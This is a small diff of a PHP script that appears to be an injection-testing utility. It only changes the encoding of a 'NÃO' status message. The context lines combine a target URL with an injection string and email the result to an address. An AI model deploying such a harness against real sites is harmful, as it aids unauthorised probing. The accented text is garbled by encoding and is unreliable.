@@ -7,7 +7,7 @@ if(isset($_GET['testa'])){
 	$target = rawurldecode($web.$inj);
 	$envio = mail("$email","[v] http://$target","http://$target");
 	if($envio) { echo '<span style="font-family: monospace;">[+] FOI</span><br>'; }
-	else { echo '<span style="font-family: monospace;">[-] N√O</span><br>'; }
+	else { echo '<span style="font-family: monospace;">[-] N√ÉO</span><br>'; }
 }
 $testa = $_POST['veio'];
 if($testa != "") {
